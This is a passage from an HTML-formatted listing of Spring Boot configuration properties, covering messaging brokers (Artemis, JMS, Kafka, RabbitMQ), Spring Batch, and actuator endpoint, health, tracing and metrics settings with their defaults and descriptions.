class="line">spring.artemis.embedded.server-id= # Server ID. By default, an auto-incremented counter is used.</span><br><span class="line">spring.artemis.embedded.topics= # Comma-separated list of topics to create on startup.</span><br><span class="line">spring.artemis.host=localhost # Artemis broker host.</span><br><span class="line">spring.artemis.mode= # Artemis deployment mode, auto-detected by default.</span><br><span class="line">spring.artemis.password= # Login password of the broker.</span><br><span class="line">spring.artemis.port=61616 # Artemis broker port.</span><br><span class="line">spring.artemis.user= # Login user of the broker.</span><br><span class="line"></span><br><span class="line"># SPRING BATCH (BatchProperties)</span><br><span class="line">spring.batch.initialize-schema=embedded # Database schema initialization mode.</span><br><span class="line">spring.batch.job.enabled=true # Execute all Spring Batch jobs in the context on startup.</span><br><span class="line">spring.batch.job.names= # Comma-separated list of job names to execute on startup (for instance, `job1,job2`). By default, all Jobs found in the context are executed.</span><br><span class="line">spring.batch.schema=classpath:org/springframework/batch/core/schema-@@platform@@.sql # Path to the SQL file to use to initialize the database schema.</span><br><span class="line">spring.batch.table-prefix= # Table prefix for all the batch meta-data tables.</span><br><span class="line"></span><br><span class="line"># SPRING INTEGRATION (IntegrationProperties)</span><br><span class="line">spring.integration.jdbc.initialize-schema=embedded # Database schema initialization mode.</span><br><span class="line">spring.integration.jdbc.schema=classpath:org/springframework/integration/jdbc/schema-@@platform@@.sql # Path to the SQL file to use to initialize the database schema.</span><br><span class="line"></span><br><span class="line"># JMS (JmsProperties)</span><br><span class="line">spring.jms.jndi-name= # Connection factory JNDI name. When set, takes precedence to others connection factory auto-configurations.</span><br><span class="line">spring.jms.listener.acknowledge-mode= # Acknowledge mode of the container. By default, the listener is transacted with automatic acknowledgment.</span><br><span class="line">spring.jms.listener.auto-startup=true # Start the container automatically on startup.</span><br><span class="line">spring.jms.listener.concurrency= # Minimum number of concurrent consumers.</span><br><span class="line">spring.jms.listener.max-concurrency= # Maximum number of concurrent consumers.</span><br><span class="line">spring.jms.pub-sub-domain=false # Whether the default destination type is topic.</span><br><span class="line">spring.jms.template.default-destination= # Default destination to use on send and receive operations that do not have a destination parameter.</span><br><span class="line">spring.jms.template.delivery-delay= # Delivery delay to use for send calls.</span><br><span class="line">spring.jms.template.delivery-mode= # Delivery mode. Enables QoS (Quality of Service) when set.</span><br><span class="line">spring.jms.template.priority= # Priority of a message when sending. Enables QoS (Quality of Service) when set.</span><br><span class="line">spring.jms.template.qos-enabled= # Whether to enable explicit QoS (Quality of Service) when sending a message.</span><br><span class="line">spring.jms.template.receive-timeout= # Timeout to use for receive calls.</span><br><span class="line">spring.jms.template.time-to-live= # Time-to-live of a message when sending. Enables QoS (Quality of Service) when set.</span><br><span class="line"></span><br><span class="line"># APACHE KAFKA (KafkaProperties)</span><br><span class="line">spring.kafka.admin.client-id= # ID to pass to the server when making requests. Used for server-side logging.</span><br><span class="line">spring.kafka.admin.fail-fast=false # Whether to fail fast if the broker is not available on startup.</span><br><span class="line">spring.kafka.admin.properties.*= # Additional admin-specific properties used to configure the client.</span><br><span class="line">spring.kafka.admin.ssl.key-password= # Password of the private key in the key store file.</span><br><span class="line">spring.kafka.admin.ssl.keystore-location= # Location of the key store file.</span><br><span class="line">spring.kafka.admin.ssl.keystore-password= # Store password for the key store file.</span><br><span class="line">spring.kafka.admin.ssl.truststore-location= # Location of the trust store file.</span><br><span class="line">spring.kafka.admin.ssl.truststore-password= # Store password for the trust store file.</span><br><span class="line">spring.kafka.bootstrap-servers= # Comma-delimited list of host:port pairs to use for establishing the initial connection to the Kafka cluster.</span><br><span class="line">spring.kafka.client-id= # ID to pass to the server when making requests. Used for server-side logging.</span><br><span class="line">spring.kafka.consumer.auto-commit-interval= # Frequency with which the consumer offsets are auto-committed to Kafka if &apos;enable.auto.commit&apos; is set to true.</span><br><span class="line">spring.kafka.consumer.auto-offset-reset= # What to do when there is no initial offset in Kafka or if the current offset no longer exists on the server.</span><br><span class="line">spring.kafka.consumer.bootstrap-servers= # Comma-delimited list of host:port pairs to use for establishing the initial connection to the Kafka cluster.</span><br><span class="line">spring.kafka.consumer.client-id= # ID to pass to the server when making requests. Used for server-side logging.</span><br><span class="line">spring.kafka.consumer.enable-auto-commit= # Whether the consumer&apos;s offset is periodically committed in the background.</span><br><span class="line">spring.kafka.consumer.fetch-max-wait= # Maximum amount of time the server blocks before answering the fetch request if there isn&apos;t sufficient data to immediately satisfy the requirement given by &quot;fetch.min.bytes&quot;.</span><br><span class="line">spring.kafka.consumer.fetch-min-size= # Minimum amount of data, in bytes, the server should return for a fetch request.</span><br><span class="line">spring.kafka.consumer.group-id= # Unique string that identifies the consumer group to which this consumer belongs.</span><br><span class="line">spring.kafka.consumer.heartbeat-interval= # Expected time between heartbeats to the consumer coordinator.</span><br><span class="line">spring.kafka.consumer.key-deserializer= # Deserializer class for keys.</span><br><span class="line">spring.kafka.consumer.max-poll-records= # Maximum number of records returned in a single call to poll().</span><br><span class="line">spring.kafka.consumer.properties.*= # Additional consumer-specific properties used to configure the client.</span><br><span class="line">spring.kafka.consumer.ssl.key-password= # Password of the private key in the key store file.</span><br><span class="line">spring.kafka.consumer.ssl.keystore-location= # Location of the key store file.</span><br><span class="line">spring.kafka.consumer.ssl.keystore-password= # Store password for the key store file.</span><br><span class="line">spring.kafka.consumer.ssl.truststore-location= # Location of the trust store file.</span><br><span class="line">spring.kafka.consumer.ssl.truststore-password= # Store password for the trust store file.</span><br><span class="line">spring.kafka.consumer.value-deserializer= # Deserializer class for values.</span><br><span class="line">spring.kafka.jaas.control-flag=required # Control flag for login configuration.</span><br><span class="line">spring.kafka.jaas.enabled=false # Whether to enable JAAS configuration.</span><br><span class="line">spring.kafka.jaas.login-module=com.sun.security.auth.module.Krb5LoginModule # Login module.</span><br><span class="line">spring.kafka.jaas.options= # Additional JAAS options.</span><br><span class="line">spring.kafka.listener.ack-count= # Number of records between offset commits when ackMode is &quot;COUNT&quot; or &quot;COUNT_TIME&quot;.</span><br><span class="line">spring.kafka.listener.ack-mode= # Listener AckMode. See the spring-kafka documentation.</span><br><span class="line">spring.kafka.listener.ack-time= # Time between offset commits when ackMode is &quot;TIME&quot; or &quot;COUNT_TIME&quot;.</span><br><span class="line">spring.kafka.listener.client-id= # Prefix for the listener&apos;s consumer client.id property.</span><br><span class="line">spring.kafka.listener.concurrency= # Number of threads to run in the listener containers.</span><br><span class="line">spring.kafka.listener.idle-event-interval= # Time between publishing idle consumer events (no data received).</span><br><span class="line">spring.kafka.listener.log-container-config= # Whether to log the container configuration during initialization (INFO level).</span><br><span class="line">spring.kafka.listener.monitor-interval= # Time between checks for non-responsive consumers. If a duration suffix is not specified, seconds will be used.</span><br><span class="line">spring.kafka.listener.no-poll-threshold= # Multiplier applied to &quot;pollTimeout&quot; to determine if a consumer is non-responsive.</span><br><span class="line">spring.kafka.listener.poll-timeout= # Timeout to use when polling the consumer.</span><br><span class="line">spring.kafka.listener.type=single # Listener type.</span><br><span class="line">spring.kafka.producer.acks= # Number of acknowledgments the producer requires the leader to have received before considering a request complete.</span><br><span class="line">spring.kafka.producer.batch-size= # Number of records to batch before sending.</span><br><span class="line">spring.kafka.producer.bootstrap-servers= # Comma-delimited list of host:port pairs to use for establishing the initial connection to the Kafka cluster.</span><br><span class="line">spring.kafka.producer.buffer-memory= # Total bytes of memory the producer can use to buffer records waiting to be sent to the server.</span><br><span class="line">spring.kafka.producer.client-id= # ID to pass to the server when making requests. Used for server-side logging.</span><br><span class="line">spring.kafka.producer.compression-type= # Compression type for all data generated by the producer.</span><br><span class="line">spring.kafka.producer.key-serializer= # Serializer class for keys.</span><br><span class="line">spring.kafka.producer.properties.*= # Additional producer-specific properties used to configure the client.</span><br><span class="line">spring.kafka.producer.retries= # When greater than zero, enables retrying of failed sends.</span><br><span class="line">spring.kafka.producer.ssl.key-password= # Password of the private key in the key store file.</span><br><span class="line">spring.kafka.producer.ssl.keystore-location= # Location of the key store file.</span><br><span class="line">spring.kafka.producer.ssl.keystore-password= # Store password for the key store file.</span><br><span class="line">spring.kafka.producer.ssl.truststore-location= # Location of the trust store file.</span><br><span class="line">spring.kafka.producer.ssl.truststore-password= # Store password for the trust store file.</span><br><span class="line">spring.kafka.producer.transaction-id-prefix= # When non empty, enables transaction support for producer.</span><br><span class="line">spring.kafka.producer.value-serializer= # Serializer class for values.</span><br><span class="line">spring.kafka.properties.*= # Additional properties, common to producers and consumers, used to configure the client.</span><br><span class="line">spring.kafka.ssl.key-password= # Password of the private key in the key store file.</span><br><span class="line">spring.kafka.ssl.keystore-location= # Location of the key store file.</span><br><span class="line">spring.kafka.ssl.keystore-password= # Store password for the key store file.</span><br><span class="line">spring.kafka.ssl.truststore-location= # Location of the trust store file.</span><br><span class="line">spring.kafka.ssl.truststore-password= # Store password for the trust store file.</span><br><span class="line">spring.kafka.template.default-topic= # Default topic to which messages are sent.</span><br><span class="line"></span><br><span class="line"># RABBIT (RabbitProperties)</span><br><span class="line">spring.rabbitmq.addresses= # Comma-separated list of addresses to which the client should connect.</span><br><span class="line">spring.rabbitmq.cache.channel.checkout-timeout= # Duration to wait to obtain a channel if the cache size has been reached.</span><br><span class="line">spring.rabbitmq.cache.channel.size= # Number of channels to retain in the cache.</span><br><span class="line">spring.rabbitmq.cache.connection.mode=channel # Connection factory cache mode.</span><br><span class="line">spring.rabbitmq.cache.connection.size= # Number of connections to cache.</span><br><span class="line">spring.rabbitmq.connection-timeout= # Connection timeout. Set it to zero to wait forever.</span><br><span class="line">spring.rabbitmq.dynamic=true # Whether to create an AmqpAdmin bean.</span><br><span class="line">spring.rabbitmq.host=localhost # RabbitMQ host.</span><br><span class="line">spring.rabbitmq.listener.direct.acknowledge-mode= # Acknowledge mode of container.</span><br><span class="line">spring.rabbitmq.listener.direct.auto-startup=true # Whether to start the container automatically on startup.</span><br><span class="line">spring.rabbitmq.listener.direct.consumers-per-queue= # Number of consumers per queue.</span><br><span class="line">spring.rabbitmq.listener.direct.default-requeue-rejected= # Whether rejected deliveries are re-queued by default.</span><br><span class="line">spring.rabbitmq.listener.direct.idle-event-interval= # How often idle container events should be published.</span><br><span class="line">spring.rabbitmq.listener.direct.prefetch= # Number of messages to be handled in a single request. It should be greater than or equal to the transaction size (if used).</span><br><span class="line">spring.rabbitmq.listener.direct.retry.enabled=false # Whether publishing retries are enabled.</span><br><span class="line">spring.rabbitmq.listener.direct.retry.initial-interval=1000ms # Duration between the first and second attempt to deliver a message.</span><br><span class="line">spring.rabbitmq.listener.direct.retry.max-attempts=3 # Maximum number of attempts to deliver a message.</span><br><span class="line">spring.rabbitmq.listener.direct.retry.max-interval=10000ms # Maximum duration between attempts.</span><br><span class="line">spring.rabbitmq.listener.direct.retry.multiplier=1 # Multiplier to apply to the previous retry interval.</span><br><span class="line">spring.rabbitmq.listener.direct.retry.stateless=true # Whether retries are stateless or stateful.</span><br><span class="line">spring.rabbitmq.listener.simple.acknowledge-mode= # Acknowledge mode of container.</span><br><span class="line">spring.rabbitmq.listener.simple.auto-startup=true # Whether to start the container automatically on startup.</span><br><span class="line">spring.rabbitmq.listener.simple.concurrency= # Minimum number of listener invoker threads.</span><br><span class="line">spring.rabbitmq.listener.simple.default-requeue-rejected= # Whether rejected deliveries are re-queued by default.</span><br><span class="line">spring.rabbitmq.listener.simple.idle-event-interval= # How often idle container events should be published.</span><br><span class="line">spring.rabbitmq.listener.simple.max-concurrency= # Maximum number of listener invoker threads.</span><br><span class="line">spring.rabbitmq.listener.simple.prefetch= # Number of messages to be handled in a single request. It should be greater than or equal to the transaction size (if used).</span><br><span class="line">spring.rabbitmq.listener.simple.retry.enabled=false # Whether publishing retries are enabled.</span><br><span class="line">spring.rabbitmq.listener.simple.retry.initial-interval=1000ms # Duration between the first and second attempt to deliver a message.</span><br><span class="line">spring.rabbitmq.listener.simple.retry.max-attempts=3 # Maximum number of attempts to deliver a message.</span><br><span class="line">spring.rabbitmq.listener.simple.retry.max-interval=10000ms #  Maximum duration between attempts.</span><br><span class="line">spring.rabbitmq.listener.simple.retry.multiplier=1 # Multiplier to apply to the previous retry interval.</span><br><span class="line">spring.rabbitmq.listener.simple.retry.stateless=true # Whether retries are stateless or stateful.</span><br><span class="line">spring.rabbitmq.listener.simple.transaction-size= # Number of messages to be processed in a transaction. That is, the number of messages between acks. For best results, it should be less than or equal to the prefetch count.</span><br><span class="line">spring.rabbitmq.listener.type=simple # Listener container type.</span><br><span class="line">spring.rabbitmq.password=guest # Login to authenticate against the broker.</span><br><span class="line">spring.rabbitmq.port=5672 # RabbitMQ port.</span><br><span class="line">spring.rabbitmq.publisher-confirms=false # Whether to enable publisher confirms.</span><br><span class="line">spring.rabbitmq.publisher-returns=false # Whether to enable publisher returns.</span><br><span class="line">spring.rabbitmq.requested-heartbeat= # Requested heartbeat timeout; zero for none. If a duration suffix is not specified, seconds will be used.</span><br><span class="line">spring.rabbitmq.ssl.enabled=false # Whether to enable SSL support.</span><br><span class="line">spring.rabbitmq.ssl.key-store= # Path to the key store that holds the SSL certificate.</span><br><span class="line">spring.rabbitmq.ssl.key-store-password= # Password used to access the key store.</span><br><span class="line">spring.rabbitmq.ssl.key-store-type=PKCS12 # Key store type.</span><br><span class="line">spring.rabbitmq.ssl.trust-store= # Trust store that holds SSL certificates.</span><br><span class="line">spring.rabbitmq.ssl.trust-store-password= # Password used to access the trust store.</span><br><span class="line">spring.rabbitmq.ssl.trust-store-type=JKS # Trust store type.</span><br><span class="line">spring.rabbitmq.ssl.algorithm= # SSL algorithm to use. By default, configured by the Rabbit client library.</span><br><span class="line">spring.rabbitmq.template.exchange= # Name of the default exchange to use for send operations.</span><br><span class="line">spring.rabbitmq.template.mandatory= # Whether to enable mandatory messages.</span><br><span class="line">spring.rabbitmq.template.receive-timeout= # Timeout for `receive()` operations.</span><br><span class="line">spring.rabbitmq.template.reply-timeout= # Timeout for `sendAndReceive()` operations.</span><br><span class="line">spring.rabbitmq.template.retry.enabled=false # Whether publishing retries are enabled.</span><br><span class="line">spring.rabbitmq.template.retry.initial-interval=1000ms # Duration between the first and second attempt to deliver a message.</span><br><span class="line">spring.rabbitmq.template.retry.max-attempts=3 # Maximum number of attempts to deliver a message.</span><br><span class="line">spring.rabbitmq.template.retry.max-interval=10000ms # Maximum duration between attempts.</span><br><span class="line">spring.rabbitmq.template.retry.multiplier=1 # Multiplier to apply to the previous retry interval.</span><br><span class="line">spring.rabbitmq.template.routing-key= # Value of a default routing key to use for send operations.</span><br><span class="line">spring.rabbitmq.username=guest # Login user to authenticate to the broker.</span><br><span class="line">spring.rabbitmq.virtual-host= # Virtual host to use when connecting to the broker.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ----------------------------------------</span><br><span class="line"># ACTUATOR PROPERTIES</span><br><span class="line"># ----------------------------------------</span><br><span class="line"></span><br><span class="line"># MANAGEMENT HTTP SERVER (ManagementServerProperties)</span><br><span class="line">management.server.add-application-context-header=false # Add the &quot;X-Application-Context&quot; HTTP header in each response.</span><br><span class="line">management.server.address= # Network address to which the management endpoints should bind. Requires a custom management.server.port.</span><br><span class="line">management.server.port= # Management endpoint HTTP port (uses the same port as the application by default). Configure a different port to use management-specific SSL.</span><br><span class="line">management.server.servlet.context-path= # Management endpoint context-path (for instance, `/management`). Requires a custom management.server.port.</span><br><span class="line">management.server.ssl.ciphers= # Supported SSL ciphers. Requires a custom management.port.</span><br><span class="line">management.server.ssl.client-auth= # Whether client authentication is wanted (&quot;want&quot;) or needed (&quot;need&quot;). Requires a trust store. Requires a custom management.server.port.</span><br><span class="line">management.server.ssl.enabled= # Whether to enable SSL support. Requires a custom management.server.port.</span><br><span class="line">management.server.ssl.enabled-protocols= # Enabled SSL protocols. Requires a custom management.server.port.</span><br><span class="line">management.server.ssl.key-alias= # Alias that identifies the key in the key store. Requires a custom management.server.port.</span><br><span class="line">management.server.ssl.key-password= # Password used to access the key in the key store. Requires a custom management.server.port.</span><br><span class="line">management.server.ssl.key-store= # Path to the key store that holds the SSL certificate (typically a jks file). Requires a custom management.server.port.</span><br><span class="line">management.server.ssl.key-store-password= # Password used to access the key store. Requires a custom management.server.port.</span><br><span class="line">management.server.ssl.key-store-provider= # Provider for the key store. Requires a custom management.server.port.</span><br><span class="line">management.server.ssl.key-store-type= # Type of the key store. Requires a custom management.server.port.</span><br><span class="line">management.server.ssl.protocol=TLS # SSL protocol to use. Requires a custom management.server.port.</span><br><span class="line">management.server.ssl.trust-store= # Trust store that holds SSL certificates. Requires a custom management.server.port.</span><br><span class="line">management.server.ssl.trust-store-password= # Password used to access the trust store. Requires a custom management.server.port.</span><br><span class="line">management.server.ssl.trust-store-provider= # Provider for the trust store. Requires a custom management.server.port.</span><br><span class="line">management.server.ssl.trust-store-type= # Type of the trust store. Requires a custom management.server.port.</span><br><span class="line"></span><br><span class="line"># CLOUDFOUNDRY</span><br><span class="line">management.cloudfoundry.enabled=true # Whether to enable extended Cloud Foundry actuator endpoints.</span><br><span class="line">management.cloudfoundry.skip-ssl-validation=false # Whether to skip SSL verification for Cloud Foundry actuator endpoint security calls.</span><br><span class="line"></span><br><span class="line"># ENDPOINTS GENERAL CONFIGURATION</span><br><span class="line">management.endpoints.enabled-by-default= # Whether to enable or disable all endpoints by default.</span><br><span class="line"></span><br><span class="line"># ENDPOINTS JMX CONFIGURATION (JmxEndpointProperties)</span><br><span class="line">management.endpoints.jmx.domain=org.springframework.boot # Endpoints JMX domain name. Fallback to &apos;spring.jmx.default-domain&apos; if set.</span><br><span class="line">management.endpoints.jmx.exposure.include=* # Endpoint IDs that should be included or &apos;*&apos; for all.</span><br><span class="line">management.endpoints.jmx.exposure.exclude= # Endpoint IDs that should be excluded.</span><br><span class="line">management.endpoints.jmx.static-names= # Additional static properties to append to all ObjectNames of MBeans representing Endpoints.</span><br><span class="line">management.endpoints.jmx.unique-names=false # Whether to ensure that ObjectNames are modified in case of conflict.</span><br><span class="line"></span><br><span class="line"># ENDPOINTS WEB CONFIGURATION (WebEndpointProperties)</span><br><span class="line">management.endpoints.web.exposure.include=health,info # Endpoint IDs that should be included or &apos;*&apos; for all.</span><br><span class="line">management.endpoints.web.exposure.exclude= # Endpoint IDs that should be excluded.</span><br><span class="line">management.endpoints.web.base-path=/actuator # Base path for Web endpoints. Relative to server.servlet.context-path or management.server.servlet.context-path if management.server.port is configured.</span><br><span class="line">management.endpoints.web.path-mapping= # Mapping between endpoint IDs and the path that should expose them.</span><br><span class="line"></span><br><span class="line"># ENDPOINTS CORS CONFIGURATION (CorsEndpointProperties)</span><br><span class="line">management.endpoints.web.cors.allow-credentials= # Whether credentials are supported. When not set, credentials are not supported.</span><br><span class="line">management.endpoints.web.cors.allowed-headers= # Comma-separated list of headers to allow in a request. &apos;*&apos; allows all headers.</span><br><span class="line">management.endpoints.web.cors.allowed-methods= # Comma-separated list of methods to allow. &apos;*&apos; allows all methods. When not set, defaults to GET.</span><br><span class="line">management.endpoints.web.cors.allowed-origins= # Comma-separated list of origins to allow. &apos;*&apos; allows all origins. When not set, CORS support is disabled.</span><br><span class="line">management.endpoints.web.cors.exposed-headers= # Comma-separated list of headers to include in a response.</span><br><span class="line">management.endpoints.web.cors.max-age=1800s # How long the response from a pre-flight request can be cached by clients. If a duration suffix is not specified, seconds will be used.</span><br><span class="line"></span><br><span class="line"># AUDIT EVENTS ENDPOINT (AuditEventsEndpoint)</span><br><span class="line">management.endpoint.auditevents.cache.time-to-live=0ms # Maximum time that a response can be cached.</span><br><span class="line">management.endpoint.auditevents.enabled=true # Whether to enable the auditevents endpoint.</span><br><span class="line"></span><br><span class="line"># BEANS ENDPOINT (BeansEndpoint)</span><br><span class="line">management.endpoint.beans.cache.time-to-live=0ms # Maximum time that a response can be cached.</span><br><span class="line">management.endpoint.beans.enabled=true # Whether to enable the beans endpoint.</span><br><span class="line"></span><br><span class="line"># CONDITIONS REPORT ENDPOINT (ConditionsReportEndpoint)</span><br><span class="line">management.endpoint.conditions.cache.time-to-live=0ms # Maximum time that a response can be cached.</span><br><span class="line">management.endpoint.conditions.enabled=true # Whether to enable the conditions endpoint.</span><br><span class="line"></span><br><span class="line"># CONFIGURATION PROPERTIES REPORT ENDPOINT (ConfigurationPropertiesReportEndpoint, ConfigurationPropertiesReportEndpointProperties)</span><br><span class="line">management.endpoint.configprops.cache.time-to-live=0ms # Maximum time that a response can be cached.</span><br><span class="line">management.endpoint.configprops.enabled=true # Whether to enable the configprops endpoint.</span><br><span class="line">management.endpoint.configprops.keys-to-sanitize=password,secret,key,token,.*credentials.*,vcap_services # Keys that should be sanitized. Keys can be simple strings that the property ends with or regular expressions.</span><br><span class="line"></span><br><span class="line"># ENVIRONMENT ENDPOINT (EnvironmentEndpoint, EnvironmentEndpointProperties)</span><br><span class="line">management.endpoint.env.cache.time-to-live=0ms # Maximum time that a response can be cached.</span><br><span class="line">management.endpoint.env.enabled=true # Whether to enable the env endpoint.</span><br><span class="line">management.endpoint.env.keys-to-sanitize=password,secret,key,token,.*credentials.*,vcap_services # Keys that should be sanitized. Keys can be simple strings that the property ends with or regular expressions.</span><br><span class="line"></span><br><span class="line"># FLYWAY ENDPOINT (FlywayEndpoint)</span><br><span class="line">management.endpoint.flyway.cache.time-to-live=0ms # Maximum time that a response can be cached.</span><br><span class="line">management.endpoint.flyway.enabled=true # Whether to enable the flyway endpoint.</span><br><span class="line"></span><br><span class="line"># HEALTH ENDPOINT (HealthEndpoint, HealthEndpointProperties)</span><br><span class="line">management.endpoint.health.cache.time-to-live=0ms # Maximum time that a response can be cached.</span><br><span class="line">management.endpoint.health.enabled=true # Whether to enable the health endpoint.</span><br><span class="line">management.endpoint.health.roles= # Roles used to determine whether or not a user is authorized to be shown details. When empty, all authenticated users are authorized.</span><br><span class="line">management.endpoint.health.show-details=never # When to show full health details.</span><br><span class="line"></span><br><span class="line"># HEAP DUMP ENDPOINT (HeapDumpWebEndpoint)</span><br><span class="line">management.endpoint.heapdump.cache.time-to-live=0ms # Maximum time that a response can be cached.</span><br><span class="line">management.endpoint.heapdump.enabled=true # Whether to enable the heapdump endpoint.</span><br><span class="line"></span><br><span class="line"># HTTP TRACE ENDPOINT (HttpTraceEndpoint)</span><br><span class="line">management.endpoint.httptrace.cache.time-to-live=0ms # Maximum time that a response can be cached.</span><br><span class="line">management.endpoint.httptrace.enabled=true # Whether to enable the httptrace endpoint.</span><br><span class="line"></span><br><span class="line"># INFO ENDPOINT (InfoEndpoint)</span><br><span class="line">info= # Arbitrary properties to add to the info endpoint.</span><br><span class="line">management.endpoint.info.cache.time-to-live=0ms # Maximum time that a response can be cached.</span><br><span class="line">management.endpoint.info.enabled=true # Whether to enable the info endpoint.</span><br><span class="line"></span><br><span class="line"># JOLOKIA ENDPOINT (JolokiaProperties)</span><br><span class="line">management.endpoint.jolokia.config.*= # Jolokia settings. Refer to the documentation of Jolokia for more details.</span><br><span class="line">management.endpoint.jolokia.enabled=true # Whether to enable the jolokia endpoint.</span><br><span class="line"></span><br><span class="line"># LIQUIBASE ENDPOINT (LiquibaseEndpoint)</span><br><span class="line">management.endpoint.liquibase.cache.time-to-live=0ms # Maximum time that a response can be cached.</span><br><span class="line">management.endpoint.liquibase.enabled=true # Whether to enable the liquibase endpoint.</span><br><span class="line"></span><br><span class="line"># LOG FILE ENDPOINT (LogFileWebEndpoint, LogFileWebEndpointProperties)</span><br><span class="line">management.endpoint.logfile.cache.time-to-live=0ms # Maximum time that a response can be cached.</span><br><span class="line">management.endpoint.logfile.enabled=true # Whether to enable the logfile endpoint.</span><br><span class="line">management.endpoint.logfile.external-file= # External Logfile to be accessed. Can be used if the logfile is written by output redirect and not by the logging system itself.</span><br><span class="line"></span><br><span class="line"># LOGGERS ENDPOINT (LoggersEndpoint)</span><br><span class="line">management.endpoint.loggers.cache.time-to-live=0ms # Maximum time that a response can be cached.</span><br><span class="line">management.endpoint.loggers.enabled=true # Whether to enable the loggers endpoint.</span><br><span class="line"></span><br><span class="line"># REQUEST MAPPING ENDPOINT  (MappingsEndpoint)</span><br><span class="line">management.endpoint.mappings.cache.time-to-live=0ms # Maximum time that a response can be cached.</span><br><span class="line">management.endpoint.mappings.enabled=true # Whether to enable the mappings endpoint.</span><br><span class="line"></span><br><span class="line"># METRICS ENDPOINT (MetricsEndpoint)</span><br><span class="line">management.endpoint.metrics.cache.time-to-live=0ms # Maximum time that a response can be cached.</span><br><span class="line">management.endpoint.metrics.enabled=true # Whether to enable the metrics endpoint.</span><br><span class="line"></span><br><span class="line"># PROMETHEUS ENDPOINT (PrometheusScrapeEndpoint)</span><br><span class="line">management.endpoint.prometheus.cache.time-to-live=0ms # Maximum time that a response can be cached.</span><br><span class="line">management.endpoint.prometheus.enabled=true # Whether to enable the prometheus endpoint.</span><br><span class="line"></span><br><span class="line"># SCHEDULED TASKS ENDPOINT (ScheduledTasksEndpoint)</span><br><span class="line">management.endpoint.scheduledtasks.cache.time-to-live=0ms # Maximum time that a response can be cached.</span><br><span class="line">management.endpoint.scheduledtasks.enabled=true # Whether to enable the scheduledtasks endpoint.</span><br><span class="line"></span><br><span class="line"># SESSIONS ENDPOINT (SessionsEndpoint)</span><br><span class="line">management.endpoint.sessions.enabled=true # Whether to enable the sessions endpoint.</span><br><span class="line"></span><br><span class="line"># SHUTDOWN ENDPOINT (ShutdownEndpoint)</span><br><span class="line">management.endpoint.shutdown.enabled=false # Whether to enable the shutdown endpoint.</span><br><span class="line"></span><br><span class="line"># THREAD DUMP ENDPOINT (ThreadDumpEndpoint)</span><br><span class="line">management.endpoint.threaddump.cache.time-to-live=0ms # Maximum time that a response can be cached.</span><br><span class="line">management.endpoint.threaddump.enabled=true # Whether to enable the threaddump endpoint.</span><br><span class="line"></span><br><span class="line"># HEALTH INDICATORS</span><br><span class="line">management.health.db.enabled=true # Whether to enable database health check.</span><br><span class="line">management.health.cassandra.enabled=true # Whether to enable Cassandra health check.</span><br><span class="line">management.health.couchbase.enabled=true # Whether to enable Couchbase health check.</span><br><span class="line">management.health.defaults.enabled=true # Whether to enable default health indicators.</span><br><span class="line">management.health.diskspace.enabled=true # Whether to enable disk space health check.</span><br><span class="line">management.health.diskspace.path= # Path used to compute the available disk space.</span><br><span class="line">management.health.diskspace.threshold=0 # Minimum disk space, in bytes, that should be available.</span><br><span class="line">management.health.elasticsearch.enabled=true # Whether to enable Elasticsearch health check.</span><br><span class="line">management.health.elasticsearch.indices= # Comma-separated index names.</span><br><span class="line">management.health.elasticsearch.response-timeout=100ms # Time to wait for a response from the cluster.</span><br><span class="line">management.health.influxdb.enabled=true # Whether to enable InfluxDB health check.</span><br><span class="line">management.health.jms.enabled=true # Whether to enable JMS health check.</span><br><span class="line">management.health.ldap.enabled=true # Whether to enable LDAP health check.</span><br><span class="line">management.health.mail.enabled=true # Whether to enable Mail health check.</span><br><span class="line">management.health.mongo.enabled=true # Whether to enable MongoDB health check.</span><br><span class="line">management.health.neo4j.enabled=true # Whether to enable Neo4j health check.</span><br><span class="line">management.health.rabbit.enabled=true # Whether to enable RabbitMQ health check.</span><br><span class="line">management.health.redis.enabled=true # Whether to enable Redis health check.</span><br><span class="line">management.health.solr.enabled=true # Whether to enable Solr health check.</span><br><span class="line">management.health.status.http-mapping= # Mapping of health statuses to HTTP status codes. By default, registered health statuses map to sensible defaults (for example, UP maps to 200).</span><br><span class="line">management.health.status.order=DOWN,OUT_OF_SERVICE,UP,UNKNOWN # Comma-separated list of health statuses in order of severity.</span><br><span class="line"></span><br><span class="line"># HTTP TRACING (HttpTraceProperties)</span><br><span class="line">management.trace.http.enabled=true # Whether to enable HTTP request-response tracing.</span><br><span class="line">management.trace.http.include=request-headers,response-headers,cookies,errors # Items to be included in the trace.</span><br><span class="line"></span><br><span class="line"># INFO CONTRIBUTORS (InfoContributorProperties)</span><br><span class="line">management.info.build.enabled=true # Whether to enable build info.</span><br><span class="line">management.info.defaults.enabled=true # Whether to enable default info contributors.</span><br><span class="line">management.info.env.enabled=true # Whether to enable environment info.</span><br><span class="line">management.info.git.enabled=true # Whether to enable git info.</span><br><span class="line">management.info.git.mode=simple # Mode to use to expose git information.</span><br><span class="line"></span><br><span class="line"># METRICS</span><br><span class="line">management.metrics.binders.files.enabled=true # Whether to enable files metrics.</span><br><span class="line">management.metrics.binders.integration.enabled=true # Whether to enable Spring Integration metrics.</span><br><span class="line">management.metrics.binders.jvm.enabled=true # Whether to enable JVM metrics.</span><br><span class="line">management.metrics.binders.logback.enabled=true # Whether to enable Logback metrics.</span><br><span class="line">management.metrics.binders.processor.enabled=true # Whether to enable processor metrics.</span><br><span class="line">management.metrics.binders.uptime.enabled=true # Whether to enable uptime metrics.</span><br><span class="line">management.metrics.distribution.percentiles-histogram.*= # Whether meter IDs starting-with the specified name should be publish percentile histograms.</span><br><span class="line">management.metrics.distribution.percentiles.*= # Specific computed non-aggregable percentiles to ship to the backend for meter IDs starting-with the specified name.</span><br><span class="line">management.metrics.distribution.sla.*= # Specific SLA boundaries for meter IDs starting-with the specified name. The longest match wins, the key `all` can also be used to configure all meters.</span><br><span class="line">management.metrics.enable.*= # Whether meter IDs starting-with the specified name should be enabled. The longest match wins, the key `all` can also be used to configure all meters.</span><br><span class="line">management.metrics.export.atlas.batch-size=10000 # Number of measurements per request to use for this backend. If more measurements are found, then multiple requests will be made.</span><br><span class="line">management.metrics.export.atlas.config-refresh-frequency=10s # Frequency for refreshing config settings from the LWC service.</span><br><span class="line">management.metrics.export.atlas.config-time-to-live=150s # Time to live for subscriptions from the LWC service.</span><br><span class="line">management.metrics.export.atlas.config-uri=http://localhost:7101/lwc/api/v1/expressions/local-dev # URI for the Atlas LWC endpoint to retrieve current subscriptions.</span><br><span class="line">management.metrics.export.atlas.connect-timeout=1s # Connection timeout for requests to this backend.</span><br><span class="line">management.metrics.export.atlas.enabled=true # Whether 